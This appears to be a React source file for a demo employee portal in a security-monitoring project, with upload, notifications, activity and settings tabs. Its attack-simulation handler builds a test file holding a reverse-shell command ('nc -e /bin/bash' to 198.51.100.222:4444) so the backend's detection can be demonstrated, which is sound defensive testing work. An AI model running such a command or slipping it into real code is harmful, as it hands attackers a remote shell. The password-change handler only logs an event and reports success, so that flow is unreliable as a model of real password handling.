import React, { useState, useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import { 
  User, Mail, Key, UploadCloud, FileText, CheckCircle2, 
  AlertCircle, Loader2, Clock, MapPin, Laptop, Bell, Settings, Lock, Zap, ShieldAlert, FileCheck, RefreshCw, AlertTriangle
} from 'lucide-react';
import { useAuth } from '../../context/AuthContext';
import { logPortalActivity, uploadPortalDocument, getPortalDocuments, getPortalActivityHistory } from '../../services/api';

export const PortalDashboard = () => {
  const { user } = useAuth();
  const location = useLocation();

  // Display 'User' or 'Employee' on corporate portal regardless of backend role claim
  const displayRole = (user?.role === 'Security Analyst' || user?.role === 'Admin') ? 'User' : (user?.role || 'User');

  // Tab State: overview, profile, documents, notifications, activity, settings
  const queryParams = new URLSearchParams(location.search);
  const initialTab = queryParams.get('tab') || 'overview';
  
  const [activeTab, setActiveTab] = useState(initialTab);
  const [file, setFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  const [uploadMessage, setUploadMessage] = useState(null);
  const [uploadError, setUploadError] = useState(null);

  const [savedDocs, setSavedDocs] = useState([]);
  const [loadingDocs, setLoadingDocs] = useState(false);

  const [oldPassword, setOldPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [pwdMessage, setPwdMessage] = useState(null);
  const [pwdError, setPwdError] = useState(null);

  const [notifications, setNotifications] = useState([
    { id: 1, title: 'Welcome to SentinelAI Workspace', desc: 'Your employee profile is active and verified.', time: 'Today 09:00', type: 'info' },
    { id: 2, title: 'System Maintenance Scheduled', desc: 'Routine cloud server optimization tonight at 23:00 UTC.', time: 'Yesterday', type: 'info' },
  ]);

  const [activities, setActivities] = useState([
    { id: 1, event: 'User Login', ip: '198.51.100.101', time: 'Just Now', status: 'Completed' },
    { id: 2, event: 'Document Upload', ip: '198.51.100.101', time: '1 hour ago', status: 'Completed' },
    { id: 3, event: 'Profile Update', ip: '198.51.100.101', time: 'Yesterday', status: 'Completed' },
  ]);

  const [isBlocked, setIsBlocked] = useState(false);

  const fetchDocuments = async () => {
    try {
      setLoadingDocs(true);
      const res = await getPortalDocuments(user?.username);
      setSavedDocs(res.documents || []);
    } catch (err) {
      console.error('Failed to fetch documents:', err);
    } finally {
      setLoadingDocs(false);
    }
  };

  const fetchActivities = async () => {
    try {
      const res = await getPortalActivityHistory(user?.username);
      if (res.activities && res.activities.length > 0) {
        setActivities(res.activities);
      }
    } catch (err) {
      console.error('Failed to fetch activities:', err);
    }
  };

  useEffect(() => {
    const tabFromUrl = new URLSearchParams(location.search).get('tab');
    if (tabFromUrl) {
      setActiveTab(tabFromUrl);
    }
  }, [location]);

  useEffect(() => {
    fetchDocuments();
    fetchActivities();
  }, [user]);

  // Log activity silently to backend (no security jargon on screen)
  useEffect(() => {
    logPortalActivity({
      event_name: 'EMPLOYEE_DASHBOARD_ACCESS',
      source_ip: '198.51.100.101',
      user_id: user?.username || 'Kishan_4',
      user_email: user?.email || 'kishan@sentinelai.com',
      country: 'India',
      city: 'Bengaluru',
      device: 'Windows Chrome'
    }).catch(() => {});
  }, [user]);

  const playPortalWarningSound = () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const playBeep = (delay) => {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();

        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(600, audioCtx.currentTime + delay);
        osc.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + delay + 0.2);

        gain.gain.setValueAtTime(0.15, audioCtx.currentTime + delay);
        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + delay + 0.2);

        osc.connect(gain);
        gain.connect(audioCtx.destination);

        osc.start(audioCtx.currentTime + delay);
        osc.stop(audioCtx.currentTime + delay + 0.2);
      };

      // Play 3 consecutive alert sound beeps
      playBeep(0.0);
      playBeep(0.3);
      playBeep(0.6);
    } catch (e) {}
  };

  const pushSecurityWarningNotification = (filename = 'suspicious_file') => {
    playPortalWarningSound();
    setNotifications(prev => [
      {
        id: Date.now(),
        title: '🚨 SECURITY WARNING: Malicious Payload Rejected',
        desc: `Unauthorized file upload attempt detected ('${filename}'). Do not upload suspicious scripts, malware, or executable files; otherwise your account and workstation IP address will be permanently blocked by Security Operations.`,
        time: 'Just Now',
        type: 'warning'
      },
      ...prev
    ]);
  };

  const handleFileUpload = async (e) => {
    e.preventDefault();
    if (!file) return;

    setUploading(true);
    setUploadMessage(null);
    setUploadError(null);

    const formData = new FormData();
    formData.append('file', file);
    formData.append('user_id', user?.username || 'Kishan_4');
    formData.append('user_email', user?.email || 'kishan@sentinelai.com');
    formData.append('source_ip', '198.51.100.101');

    try {
      const res = await uploadPortalDocument(formData);
      setUploadMessage(`Document '${res.filename}' uploaded successfully & scanned clean.`);
      setFile(null);
      await fetchDocuments();
      await fetchActivities();
    } catch (err) {
      console.error('Upload error:', err);
      const detail = err.response?.data?.detail || 'Document upload request failed.';
      setUploadError(detail);
      pushSecurityWarningNotification(file?.name || 'uploaded file');
      
      if (detail.includes('Malicious') || detail.includes('Threat') || detail.includes('Rejected')) {
        setIsBlocked(true);
      }
    } finally {
      setUploading(false);
    }
  };

  const handleSimulateMaliciousUpload = async () => {
    setUploading(true);
    setUploadError(null);

    // Create synthetic malicious RCE shell script payload file
    const blob = new Blob(["#!/bin/bash\n# Malicious Remote Shell Execution\nnc -e /bin/bash 198.51.100.222 4444\neval('malware_code')"], { type: 'text/plain' });
    const maliciousFile = new File([blob], 'malicious_webshell.sh', { type: 'text/plain' });

    const formData = new FormData();
    formData.append('file', maliciousFile);
    formData.append('user_id', user?.username || 'Sourabh_4');
    formData.append('user_email', user?.email || 'sourabh@sentinelai.com');
    formData.append('source_ip', '198.51.100.222');

    pushSecurityWarningNotification('malicious_webshell.sh');

    try {
      await uploadPortalDocument(formData);
    } catch (err) {
      const detail = err.response?.data?.detail || 'Malicious RCE script detected.';
      setUploadError(detail);
      setIsBlocked(true);
    } finally {
      setUploading(false);
    }
  };

  const handleSimulateUBAAttack = async () => {
    setNotifications(prev => [
      {
        id: Date.now(),
        title: '⚠️ SECURITY WARNING: Anomaloous Geographic Login Shift',
        desc: `Unverified login session detected from Moscow, Russia (198.51.100.222). Do not attempt unapproved remote proxy logins; otherwise account access will be terminated.`,
        time: 'Just Now',
        type: 'warning'
      },
      ...prev
    ]);

    try {
      await logPortalActivity({
        event_name: 'ANOMALOUS_GEOGRAPHIC_SHIFT_LOGIN',
        source_ip: '198.51.100.222',
        user_id: user?.username || 'Sourabh_4',
        user_email: user?.email || 'sourabh@sentinelai.com',
        country: 'Russia',
        city: 'Moscow',
        device: 'Linux Workstation'
      });
      fetchActivities();
    } catch (e) {}
  };

  const handleChangePassword = async (e) => {
    e.preventDefault();
    setPwdMessage(null);
    setPwdError(null);

    if (!oldPassword || !newPassword) {
      setPwdError('Please fill in all password fields.');
      return;
    }

    try {
      await logPortalActivity({
        event_name: 'PASSWORD_CHANGE_ATTEMPT',
        source_ip: '198.51.100.101',
        user_id: user?.username || 'Kishan_4',
        user_email: user?.email || 'kishan@sentinelai.com'
      });
      setPwdMessage('Account password updated successfully.');
      setOldPassword('');
      setNewPassword('');
    } catch (err) {
      setPwdError('Password update failed. Please try again.');
    }
  };

  if (isBlocked) {
    return (
      <div className="max-w-xl mx-auto my-16 p-8 bg-slate-950 border border-slate-800 rounded-2xl text-center space-y-4 shadow-2xl font-sans">
        <div className="p-4 bg-red-500/10 text-red-400 rounded-full w-fit mx-auto border border-red-500/20">
          <Lock className="w-10 h-10 animate-bounce" />
        </div>
        <h2 className="text-2xl font-extrabold text-white">403 Forbidden - Access Locked</h2>
        <p className="text-xs text-slate-400 leading-relaxed">
          Your request or document upload was flagged and rejected. Your IP address has been contained and account access locked.
        </p>
        <div className="pt-2 text-[11px] font-mono text-red-400/80 bg-red-950/40 p-3 rounded-xl border border-red-900/40">
          Incident ID: INC-{Math.floor(Math.random() * 899999 + 100000)} | Status: CONTAINED BY SOC
        </div>
        <div className="pt-3 flex justify-center space-x-3">
          <button
            onClick={() => {
              setIsBlocked(false);
              setActiveTab('notifications');
            }}
            className="px-4 py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-semibold transition-colors flex items-center space-x-2"
          >
            <Bell className="w-4 h-4 text-amber-300" />
            <span>View Security Warning Notifications</span>
          </button>
        </div>
      </div>
    );
  }

  const warningCount = notifications.filter(n => n.type === 'warning').length;

  return (
    <div className="space-y-6 font-sans">
      {/* Top Profile Header Bar */}
      <div className="glass-panel p-6 rounded-2xl border border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div className="flex items-center space-x-4">
          <div className="w-14 h-14 rounded-2xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400 text-xl font-bold">
            {user?.username?.[0]?.toUpperCase() || 'U'}
          </div>
          <div>
            <h1 className="text-xl font-bold text-white tracking-wide">{user?.username || 'User'}</h1>
            <p className="text-xs text-slate-400 mt-0.5">{user?.email || 'user@sentinelai.com'}</p>
            <div className="flex items-center space-x-2 mt-2">
              <span className="px-2.5 py-0.5 bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] font-semibold rounded-full uppercase">
                {displayRole}
              </span>
              <span className="px-2.5 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-semibold rounded-full uppercase flex items-center space-x-1">
                <CheckCircle2 className="w-3 h-3" />
                <span>Active Workspace</span>
              </span>
            </div>
          </div>
        </div>

        {/* Tab Selection Bar */}
        <div className="flex flex-wrap items-center gap-1 border border-slate-800 bg-slate-950 p-1.5 rounded-xl text-xs">
          {['overview', 'profile', 'documents', 'notifications', 'activity', 'settings'].map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-3 py-1.5 rounded-lg font-medium capitalize transition-colors relative flex items-center space-x-1.5 ${
                activeTab === tab ? 'bg-blue-600 text-white' : 'text-slate-400 hover:text-white'
              }`}
            >
              <span>{tab}</span>
              {tab === 'notifications' && warningCount > 0 && (
                <span className="w-4 h-4 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center animate-pulse">
                  {warningCount}
                </span>
              )}
            </button>
          ))}
        </div>
      </div>

      {/* Tab 1: Overview */}
      {activeTab === 'overview' && (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="p-5 bg-slate-950/60 border border-slate-800 rounded-2xl space-y-2">
            <span className="text-xs text-slate-400 font-medium uppercase">Last Login Time</span>
            <div className="flex items-center space-x-2 text-white font-bold text-lg">
              <Clock className="w-5 h-5 text-blue-400" />
              <span>Today at 09:15 UTC</span>
            </div>
            <p className="text-[11px] text-slate-500">Verified Workstation Session</p>
          </div>

          <div className="p-5 bg-slate-950/60 border border-slate-800 rounded-2xl space-y-2">
            <span className="text-xs text-slate-400 font-medium uppercase">Workstation Location</span>
            <div className="flex items-center space-x-2 text-white font-bold text-lg">
              <MapPin className="w-5 h-5 text-emerald-400" />
              <span>Bengaluru, India</span>
            </div>
            <p className="text-[11px] text-slate-500">Primary Office Location</p>
          </div>

          <div className="p-5 bg-slate-950/60 border border-slate-800 rounded-2xl space-y-2">
            <span className="text-xs text-slate-400 font-medium uppercase">System Device</span>
            <div className="flex items-center space-x-2 text-white font-bold text-lg">
              <Laptop className="w-5 h-5 text-purple-400" />
              <span>Windows Workstation</span>
            </div>
            <p className="text-[11px] text-slate-500">Enterprise Managed Device</p>
          </div>
        </div>
      )}

      {/* Tab 2: Profile */}
      {activeTab === 'profile' && (
        <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4 max-w-xl">
          <h3 className="text-base font-bold text-white flex items-center space-x-2">
            <User className="w-5 h-5 text-blue-400" />
            <span>Profile Details</span>
          </h3>
          <div className="space-y-3 text-xs">
            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl flex justify-between">
              <span className="text-slate-400">Username:</span>
              <span className="text-white font-semibold">{user?.username || 'User'}</span>
            </div>
            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl flex justify-between">
              <span className="text-slate-400">Email Address:</span>
              <span className="text-white font-semibold">{user?.email || 'user@sentinelai.com'}</span>
            </div>
            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl flex justify-between">
              <span className="text-slate-400">Role:</span>
              <span className="text-blue-400 font-semibold">{displayRole}</span>
            </div>
          </div>
        </div>
      )}

      {/* Tab 3: Documents */}
      {(activeTab === 'documents' || activeTab === 'upload') && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Document Upload Form */}
            <div className="lg:col-span-2 glass-panel p-6 rounded-2xl border border-slate-800 space-y-5">
              <div>
                <h3 className="text-base font-bold text-white flex items-center space-x-2">
                  <UploadCloud className="w-5 h-5 text-blue-400" />
                  <span>Upload Corporate Document</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">Select documents for corporate record processing.</p>
              </div>

              {uploadMessage && (
                <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-xs text-emerald-400 flex items-center space-x-2">
                  <CheckCircle2 className="w-4 h-4 shrink-0" />
                  <span>{uploadMessage}</span>
                </div>
              )}

              {uploadError && (
                <div className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-400 flex items-center space-x-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{uploadError}</span>
                </div>
              )}

              <form onSubmit={handleFileUpload} className="space-y-4">
                <div className="border-2 border-dashed border-slate-800 hover:border-blue-500/50 rounded-2xl p-6 text-center space-y-3 bg-slate-950/40 transition-colors">
                  <UploadCloud className="w-10 h-10 text-slate-500 mx-auto" />
                  <div>
                    <p className="text-xs font-medium text-slate-300">Click to select or drag document</p>
                    <p className="text-[10px] text-slate-500 mt-0.5">Supports PDF, DOCX, CSV, TXT files</p>
                  </div>
                  <input
                    type="file"
                    onChange={(e) => setFile(e.target.files[0])}
                    className="hidden"
                    id="file-upload-input"
                  />
                  <label
                    htmlFor="file-upload-input"
                    className="inline-block px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white rounded-xl cursor-pointer transition-colors"
                  >
                    Browse File
                  </label>
                  {file && (
                    <p className="text-xs font-mono text-blue-400 mt-2">
                      Selected: {file.name} ({(file.size / 1024).toFixed(1)} KB)
                    </p>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={!file || uploading}
                  className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-800 disabled:cursor-not-allowed text-white text-xs font-semibold rounded-xl transition-all flex items-center justify-center space-x-2"
                >
                  {uploading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Processing File...</span>
                    </>
                  ) : (
                    <span>Upload Document</span>
                  )}
                </button>
              </form>
            </div>

            {/* Quick Demo Attack Trigger Card */}
            <div className="glass-panel p-5 rounded-2xl border border-slate-800 space-y-4 h-fit">
              <h4 className="text-xs font-bold text-slate-300 flex items-center space-x-2">
                <Zap className="w-4 h-4 text-amber-400" />
                <span>Interactive Attack Simulation</span>
              </h4>
              <p className="text-[11px] text-slate-400 leading-relaxed">
                Test how attacker actions on this portal immediately dispatch real-time alerts onto the SOC Console (port 5174):
              </p>

              <button
                onClick={handleSimulateMaliciousUpload}
                disabled={uploading}
                className="w-full py-2.5 px-3 bg-red-950/60 hover:bg-red-900/60 border border-red-800/60 text-red-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
              >
                <span>1. Upload Malicious Script (.sh)</span>
                <ShieldAlert className="w-3.5 h-3.5 text-red-400 shrink-0" />
              </button>

              <button
                onClick={handleSimulateUBAAttack}
                className="w-full py-2.5 px-3 bg-amber-950/60 hover:bg-amber-900/60 border border-amber-800/60 text-amber-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
              >
                <span>2. Trigger Remote Location Shift</span>
                <MapPin className="w-3.5 h-3.5 text-amber-400 shrink-0" />
              </button>
            </div>
          </div>

          {/* Saved Document Repository View */}
          <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <h3 className="text-sm font-bold text-white flex items-center space-x-2">
                <FileCheck className="w-4 h-4 text-emerald-400" />
                <span>Uploaded Document Repository ({savedDocs.length})</span>
              </h3>
              <button
                onClick={fetchDocuments}
                className="p-1.5 text-slate-400 hover:text-white transition-colors"
                title="Refresh Documents"
              >
                <RefreshCw className="w-3.5 h-3.5" />
              </button>
            </div>

            {loadingDocs ? (
              <p className="text-xs text-slate-500 text-center py-6">Loading saved documents...</p>
            ) : savedDocs.length > 0 ? (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="text-slate-400 border-b border-slate-800 bg-slate-900/40">
                    <tr>
                      <th className="pb-3 pt-2 font-medium">Filename</th>
                      <th className="pb-3 pt-2 font-medium">File Size</th>
                      <th className="pb-3 pt-2 font-medium">SHA256 Hash</th>
                      <th className="pb-3 pt-2 font-medium">Scan Result</th>
                      <th className="pb-3 pt-2 font-medium text-right">Uploaded At</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60">
                    {savedDocs.map((doc) => (
                      <tr key={doc.id} className="hover:bg-slate-800/30">
                        <td className="py-3 font-semibold text-slate-200 flex items-center space-x-2">
                          <FileText className="w-4 h-4 text-blue-400" />
                          <span>{doc.filename}</span>
                        </td>
                        <td className="py-3 font-mono text-slate-400">{doc.file_size_kb} KB</td>
                        <td className="py-3 font-mono text-[10px] text-slate-500 truncate max-w-[120px]">{doc.file_hash}</td>
                        <td className="py-3">
                          <span className="px-2 py-0.5 rounded-full font-bold text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                            {doc.scan_result}
                          </span>
                        </td>
                        <td className="py-3 text-right text-slate-400 font-mono text-[10px]">
                          {new Date(doc.uploaded_at).toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            ) : (
              <p className="text-xs text-slate-500 text-center py-8">No uploaded documents yet. Select a file above to upload.</p>
            )}
          </div>
        </div>
      )}

      {/* Tab 4: Notifications */}
      {activeTab === 'notifications' && (
        <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4 max-w-xl">
          <h3 className="text-base font-bold text-white flex items-center space-x-2">
            <Bell className="w-5 h-5 text-blue-400" />
            <span>Employee Notifications & Security Alerts</span>
          </h3>
          <div className="space-y-3">
            {notifications.map((n) => (
              <div 
                key={n.id} 
                className={`p-4 rounded-xl border space-y-1.5 transition-all ${
                  n.type === 'warning' 
                    ? 'bg-red-950/40 border-red-800/60 shadow-lg shadow-red-950/30' 
                    : 'bg-slate-950 border-slate-800'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className={`text-xs font-bold flex items-center space-x-1.5 ${
                    n.type === 'warning' ? 'text-red-400 font-extrabold' : 'text-white'
                  }`}>
                    {n.type === 'warning' && <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 animate-pulse" />}
                    <span>{n.title}</span>
                  </span>
                  <span className="text-[10px] text-slate-500">{n.time}</span>
                </div>
                <p className={`text-xs leading-relaxed ${
                  n.type === 'warning' ? 'text-red-200/90 font-medium' : 'text-slate-400'
                }`}>
                  {n.desc}
                </p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 5: Activity History */}
      {activeTab === 'activity' && (
        <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <h3 className="text-base font-bold text-white flex items-center space-x-2">
              <FileText className="w-5 h-5 text-blue-400" />
              <span>Personal Activity History</span>
            </h3>
            <button
              onClick={fetchActivities}
              className="p-1.5 text-slate-400 hover:text-white transition-colors"
              title="Refresh Activity"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="text-slate-400 border-b border-slate-800 bg-slate-900/40">
                <tr>
                  <th className="pb-3 pt-2 font-medium">Activity</th>
                  <th className="pb-3 pt-2 font-medium">IP Address</th>
                  <th className="pb-3 pt-2 font-medium">User Account</th>
                  <th className="pb-3 pt-2 font-medium">Time</th>
                  <th className="pb-3 pt-2 font-medium text-right">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {activities.map((act, idx) => (
                  <tr key={act.id || idx} className="hover:bg-slate-800/30">
                    <td className="py-3 font-medium text-slate-200">{act.event}</td>
                    <td className="py-3 font-mono text-slate-400">{act.ip}</td>
                    <td className="py-3 font-mono text-slate-300">{act.user_id || user?.username || 'User'}</td>
                    <td className="py-3 text-slate-400">{new Date(act.time).toLocaleString() !== 'Invalid Date' ? new Date(act.time).toLocaleString() : act.time}</td>
                    <td className="py-3 text-right">
                      <span className={`px-2 py-0.5 rounded-full font-bold text-[10px] border ${
                        act.status === 'Blocked' 
                          ? 'bg-red-500/10 text-red-400 border-red-500/20' 
                          : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
                      }`}>
                        {act.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Tab 6: Settings */}
      {activeTab === 'settings' && (
        <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-5 max-w-xl">
          <div>
            <h3 className="text-base font-bold text-white flex items-center space-x-2">
              <Settings className="w-5 h-5 text-blue-400" />
              <span>Change Password</span>
            </h3>
            <p className="text-xs text-slate-400 mt-1">Update your login password.</p>
          </div>

          {pwdMessage && (
            <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-xs text-emerald-400 flex items-center space-x-2">
              <CheckCircle2 className="w-4 h-4 shrink-0" />
              <span>{pwdMessage}</span>
            </div>
          )}

          {pwdError && (
            <div className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-400 flex items-center space-x-2">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{pwdError}</span>
            </div>
          )}

          <form onSubmit={handleChangePassword} className="space-y-4">
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1.5">Current Password</label>
              <input
                type="password"
                value={oldPassword}
                onChange={(e) => setOldPassword(e.target.value)}
                placeholder="••••••••••••"
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-slate-300 mb-1.5">New Password</label>
              <input
                type="password"
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="••••••••••••"
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-blue-500"
              />
            </div>
            <button
              type="submit"
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-xl transition-all"
            >
              Update Password
            </button>
          </form>
        </div>
      )}
    </div>
  );
};
